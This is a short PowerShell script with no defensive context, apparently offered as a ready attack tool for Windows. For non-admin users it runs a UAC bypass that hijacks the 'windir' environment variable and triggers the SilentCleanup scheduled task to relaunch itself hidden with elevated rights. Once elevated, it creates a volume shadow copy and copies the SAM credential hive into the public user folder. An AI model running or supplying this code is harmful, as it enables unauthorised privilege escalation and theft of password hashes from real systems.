#Working???
#Requires -Version 2.0

# If current user belongs to built-in Admins group execute payload directly
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator (even if script is executed from non-priviliged)
    $syslink1 = (Get-WmiObject -List Win32_ShadowCopy).Create("$env:SystemDrive\\", "ClientAccessible")
    $syslink2 = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $syslink1.ShadowID }
    $directory = $syslink2.DeviceObject + "\\"
    $OutFile = $env:PUBLIC # Location to copied SAM (C:\Users\Public by default)

    if ((get-service vss).status -eq "Stopped") {
        Start-Service VSS
        cmd /c mklink /d $env:SystemDrive\shadowcopy "$directory"
        Start-Sleep -s 1
        Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SAM" -destination "$OutFile" -recurse
        cmd /c rmdir "$env:SystemDrive\shadowcopy"
        Start-Sleep -s 1
        Stop-Service VSS
    }
    elseif ((get-service vss).status -eq "Running") {
        cmd /c mklink /d $env:SystemDrive\shadowcopy "$directory"
        Copy-Item -Path "$env:SystemDrive\shadowcopy\windows\system32\config\SAM" -destination "$OutFile" -recurse
        cmd /c rmdir $env:SystemDrive\shadowcopy
    }
}
	
else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell.exe -Version 2 -ep bypass -w hidden -Command `"& `'$PSCommandPath`'`";#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    Start-Sleep -s 1
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Start-Sleep -s 1
    Remove-ItemProperty -Path $registryPath -Name $Name
}
